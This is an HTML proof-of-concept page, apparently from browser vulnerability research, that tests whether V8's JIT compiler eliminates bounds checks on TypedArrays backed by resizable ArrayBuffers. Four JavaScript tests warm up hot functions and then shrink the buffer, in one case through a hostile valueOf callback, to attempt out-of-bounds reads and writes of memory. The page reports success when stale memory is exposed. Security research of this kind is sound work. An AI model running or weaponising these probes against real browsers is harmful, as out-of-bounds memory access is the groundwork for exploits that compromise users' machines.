<!DOCTYPE html>
<html>
<head>
<title>V8 RAB Bounds Check Elimination OOB - PoC</title>
<style>
body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
.result { margin: 5px 0; padding: 5px; border-left: 3px solid #333; }
.vuln { border-left-color: #ff0000; color: #ff4444; }
.safe { border-left-color: #00ff00; }
.info { border-left-color: #0088ff; color: #88bbff; }
h2 { color: #ffaa00; }
pre { background: #222; padding: 10px; overflow-x: auto; }
button { background: #333; color: #00ff00; border: 1px solid #00ff00; padding: 8px 16px; cursor: pointer; margin: 5px; }
button:hover { background: #00ff00; color: #000; }
</style>
</head>
<body>
<h1>V8 RAB Bounds Check Elimination OOB (Finding #3)</h1>
<p>Tests whether Turbofan eliminates bounds checks for TypedArrays backed by 
Resizable ArrayBuffers, allowing OOB access after resize.</p>

<div>
<button onclick="runTest1()">Test 1: RAB Resize After JIT (Read)</button>
<button onclick="runTest2()">Test 2: RAB Resize After JIT (Write)</button>
<button onclick="runTest3()">Test 3: RAB Resize via valueOf callback</button>
<button onclick="runTest4()">Test 4: RAB Resize from Worker</button>
<button onclick="runAll()">Run All Tests</button>
</div>

<div id="output"></div>

<script>
const output = document.getElementById('output');
function log(msg, cls='info') {
    const div = document.createElement('div');
    div.className = 'result ' + cls;
    div.textContent = msg;
    output.appendChild(div);
}

function logCode(code) {
    const pre = document.createElement('pre');
    pre.textContent = code;
    output.appendChild(pre);
}

// ======================================================================
// TEST 1: RAB Resize After JIT Compilation (Read OOB)
// ======================================================================
function runTest1() {
    log('=== TEST 1: RAB Resize After JIT (Read OOB) ===', 'info');
    
    try {
        // Check if ResizableArrayBuffer is supported
        const testRab = new ArrayBuffer(16, { maxByteLength: 32 });
        if (!testRab.resizable) {
            log('ResizableArrayBuffer not supported in this Chrome version', 'safe');
            return;
        }
    } catch(e) {
        log('ResizableArrayBuffer not supported: ' + e.message, 'safe');
        return;
    }
    
    const rab = new ArrayBuffer(0x1000, { maxByteLength: 0x2000 });
    const ta = new Int32Array(rab);
    
    // Fill with known pattern
    for (let i = 0; i < ta.length; i++) {
        ta[i] = 0x41414141;
    }
    
    // Hot function that accesses element at index
    function readElement(arr, idx) {
        return arr[idx];
    }
    
    // Warm up JIT - access valid indices
    log('Warming up JIT with valid indices...');
    for (let i = 0; i < 200000; i++) {
        readElement(ta, i % 256);  // Always valid index < 1024 (0x1000/4)
    }
    
    // Now resize the buffer smaller
    log('Resizing buffer from 0x1000 to 0x10 bytes...');
    rab.resize(0x10);  // Now only 4 Int32 elements
    
    log('New ta.length: ' + ta.length);
    log('New rab.byteLength: ' + rab.byteLength);
    
    // Attempt OOB read - index 200 should be beyond new buffer
    try {
        const val = readElement(ta, 200);
        if (val === undefined) {
            log('Read returned undefined (bounds check working correctly)', 'safe');
        } else {
            log('!!! OOB READ SUCCESSFUL: ta[200] = 0x' + (val >>> 0).toString(16), 'vuln');
            log('Buffer was resized to 4 elements but we read index 200!', 'vuln');
            log('This indicates bounds check was eliminated by JIT', 'vuln');
        }
    } catch(e) {
        log('Exception on OOB read: ' + e.message, 'safe');
    }
    
    logCode(`// Reproduction:
const rab = new ArrayBuffer(0x1000, { maxByteLength: 0x2000 });
const ta = new Int32Array(rab);
function readElement(arr, idx) { return arr[idx]; }
for (let i = 0; i < 200000; i++) readElement(ta, i % 256);
rab.resize(0x10);
console.log(readElement(ta, 200)); // Should be undefined, OOB if not`);
}

// ======================================================================
// TEST 2: RAB Resize After JIT Compilation (Write OOB)
// ======================================================================
function runTest2() {
    log('=== TEST 2: RAB Resize After JIT (Write OOB) ===', 'info');
    
    try {
        const testRab = new ArrayBuffer(16, { maxByteLength: 32 });
        if (!testRab.resizable) {
            log('ResizableArrayBuffer not supported', 'safe');
            return;
        }
    } catch(e) {
        log('ResizableArrayBuffer not supported: ' + e.message, 'safe');
        return;
    }
    
    const rab = new ArrayBuffer(0x1000, { maxByteLength: 0x2000 });
    const ta = new Float64Array(rab);
    
    // Function that writes to typed array
    function writeElement(arr, idx, val) {
        arr[idx] = val;
    }
    
    // Warm up
    log('Warming up JIT with valid writes...');
    for (let i = 0; i < 200000; i++) {
        writeElement(ta, i % 128, 1.1 + i);  // Valid indices < 512 (0x1000/8)
    }
    
    // Marker value in adjacent memory
    const sentinel = 6.953355807412908e-310;  // 0xDEADBEEF as float64
    
    // Resize smaller
    log('Resizing buffer from 0x1000 to 0x8 bytes...');
    rab.resize(0x8);  // Only 1 Float64 element
    
    // Try OOB write
    try {
        writeElement(ta, 100, sentinel);
        log('Write to ta[100] did not throw (buffer has 1 element)', 'vuln');
        
        // Check if we can read it back
        rab.resize(0x1000);  // Resize back
        const readBack = ta[100];
        if (readBack === sentinel) {
            log('!!! OOB WRITE CONFIRMED: Value persisted after resize back!', 'vuln');
        } else {
            log('Value at ta[100] after resize back: ' + readBack, 'info');
        }
    } catch(e) {
        log('Exception on OOB write: ' + e.message, 'safe');
    }
}

// ======================================================================
// TEST 3: RAB Resize via valueOf Callback During Index Computation
// ======================================================================
function runTest3() {
    log('=== TEST 3: RAB Resize via valueOf Callback ===', 'info');
    
    try {
        const testRab = new ArrayBuffer(16, { maxByteLength: 32 });
    } catch(e) {
        log('ResizableArrayBuffer not supported: ' + e.message, 'safe');
        return;
    }
    
    const rab = new ArrayBuffer(0x1000, { maxByteLength: 0x2000 });
    const ta = new Uint32Array(rab);
    
    for (let i = 0; i < ta.length; i++) ta[i] = i;
    
    // Create an object whose valueOf resizes the buffer
    let triggerResize = false;
    const evilIndex = {
        valueOf() {
            if (triggerResize) {
                log('valueOf called - resizing buffer!', 'info');
                rab.resize(4);  // Shrink to 1 element
            }
            return 200;  // Return index beyond new size
        }
    };
    
    function accessWithIndex(arr, idx) {
        return arr[idx];
    }
    
    // Warm up with normal number index
    for (let i = 0; i < 100000; i++) {
        accessWithIndex(ta, 0);
    }
    
    // Now trigger with the evil index
    triggerResize = true;
    try {
        const val = accessWithIndex(ta, evilIndex);
        if (val === undefined) {
            log('Returned undefined after resize (safe)', 'safe');
        } else {
            log('!!! OOB via valueOf: ta[200] = ' + val + ' (after resize to 1 elem)', 'vuln');
        }
    } catch(e) {
        log('Exception: ' + e.message, 'safe');
    }
}

// ======================================================================
// TEST 4: RAB Resize from Worker Thread (SAB + RAB)
// ======================================================================
function runTest4() {
    log('=== TEST 4: Concurrent Resize Race Condition ===', 'info');
    
    // SharedArrayBuffer-based RAB (GSAB) would be needed for true concurrency
    // But GSAB is not resizable in the same way. Test with postMessage timing.
    
    try {
        const sab = new SharedArrayBuffer(16);
        log('SharedArrayBuffer available', 'info');
    } catch(e) {
        log('SharedArrayBuffer not available (need COOP/COEP headers): ' + e.message, 'info');
        // Still test with main thread timing
    }
    
    // Test with main-thread microtask timing instead
    const rab = new ArrayBuffer(0x1000, { maxByteLength: 0x2000 });
    const ta = new Int32Array(rab);
    for (let i = 0; i < ta.length; i++) ta[i] = 0xCAFEBABE;
    
    function hotLoop(arr) {
        let sum = 0;
        for (let i = 0; i < 256; i++) {
            sum += arr[i];
        }
        return sum;
    }
    
    // Warm up
    for (let i = 0; i < 50000; i++) hotLoop(ta);
    
    // Schedule a resize via Promise microtask
    let resized = false;
    Promise.resolve().then(() => {
        rab.resize(4);
        resized = true;
    });
    
    // Run the hot loop - the microtask might fire between iterations
    try {
        const result = hotLoop(ta);
        log('Hot loop result: 0x' + (result >>> 0).toString(16), 'info');
        log('Buffer resized during loop: ' + resized, 'info');
        
        if (resized && result !== 0) {
            log('Loop completed with stale length after resize', 'vuln');
        } else {
            log('No observable race condition', 'safe');
        }
    } catch(e) {
        log('Exception during hot loop: ' + e.message, 'safe');
    }
}

function runAll() {
    output.innerHTML = '';
    log('Starting all tests against Chrome ' + 
        (/Chrome\/(\d+\.\d+\.\d+\.\d+)/.exec(navigator.userAgent) || ['','unknown'])[1]);
    log('Date: ' + new Date().toISOString());
    log('');
    
    runTest1();
    log('');
    runTest2();
    log('');
    runTest3();
    log('');
    runTest4();
    
    log('');
    log('=== All tests complete ===', 'info');
}
</script>
</body>
</html>
